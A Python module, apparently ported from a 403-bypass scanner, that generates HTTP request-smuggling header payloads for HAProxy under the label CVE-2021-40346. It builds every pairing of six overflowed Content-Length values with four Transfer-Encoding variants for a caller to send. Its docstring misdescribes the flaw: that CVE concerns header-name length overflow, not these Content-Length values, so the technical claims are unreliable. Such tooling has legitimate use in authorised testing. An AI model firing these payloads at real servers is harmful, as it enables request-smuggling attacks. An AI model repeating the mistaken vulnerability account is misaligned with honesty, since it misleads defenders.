#!/usr/bin/env python3
"""
## Source: gobypass403 core/engine/payload/headers_url.go (CVE-2021-40346 payload generators)
## Source: gobypass403 core/engine/payload/url.go (Content-Length overflow helpers)
## License: MIT (gobypass403)
## Port: 2026-09-05

CVE-2021-40346 — HAProxy HTTP request smuggling (integer overflow).

The vulnerability allowed an attacker to set ``Content-Length`` to a
32-bit-overflow value (e.g. ``-1`` cast through Go's ``int`` to
``4294967295``). HAProxy forwarded the request line and headers to the
backend with the spoofed length, while a *second* ``Content-Length``
header (smaller) was honoured by the upstream parser -- producing a
smuggled-prefix request body. Fix landed in HAProxy 2.0.25, 2.2.17,
2.3.14, 2.4.4.

The gobypass403 generator emits six canonical forms; we replicate them
verbatim (see ``Payloads.OVERFLOW_FORMS``).

NOTE: the engine fires the request through ``tools.runtime.scope.check_url``
before any network call -- a probe that smuggles into an out-of-scope
host fails closed with ``ScopeViolation`` per AP-XP-2.
"""

from __future__ import annotations

from typing import Dict, List


class CVE202140346:
    """CVE-2021-40346 — HAProxy Content-Length integer-overflow smuggling."""

    cve_id: str = "CVE-2021-40346"
    references: list = [
        "https://nvd.nist.gov/vuln/detail/CVE-2021-40346",
        "https://www.haproxy.org/download/2.4/src/CHANGELOG",
    ]

    # gobypass403 source tree emits these six overflow forms. Each one is
    # a *value* meant to populate the Content-Length header.
    OVERFLOW_FORMS: List[str] = [
        "4294967295",    # 2^32 - 1 (uint32 max)
        "4294967296",    # 2^32     (zero-extended)
        "-1",            # int32   -1  == uint32 0xFFFFFFFF
        "-2",            # int32   -2  == uint32 0xFFFFFFFE
        "18446744073709551614",   # 2^64 - 2
        "18446744073709551615",   # 2^64 - 1
    ]

    # The matching ``Transfer-Encoding`` variants that, paired with the
    # bogus Content-Length, produce a smuggling conflict.
    TE_VARIANTS: List[str] = [
        "chunked",
        "identity",
        "chunked, identity",
        "identity, chunked",
    ]

    def content_length_values(self) -> List[str]:
        """Return all six canonical Content-Length overflow forms."""
        return list(self.OVERFLOW_FORMS)

    def transfer_encoding_variants(self) -> List[str]:
        """Return the four Transfer-Encoding variants that trigger the
        smuggling conflict when paired with the overflow length."""
        return list(self.TE_VARIANTS)

    def payload(self, path: str) -> List[Dict[str, str]]:
        """Return every (Content-Length, Transfer-Encoding) header pair
        that exercises the bypass. The caller fires one request per
        returned dict, in any order.
        """
        combos: List[Dict[str, str]] = []
        for cl in self.OVERFLOW_FORMS:
            for te in self.TE_VARIANTS:
                combos.append({
                    "Content-Length": cl,
                    "Transfer-Encoding": te,
                    "X-Forwarded-Path": path,
                })
        return combos

    def name(self) -> str:
        return self.cve_id

    def technique(self) -> str:
        return "HAProxy Content-Length integer overflow (CVE-2021-40346)"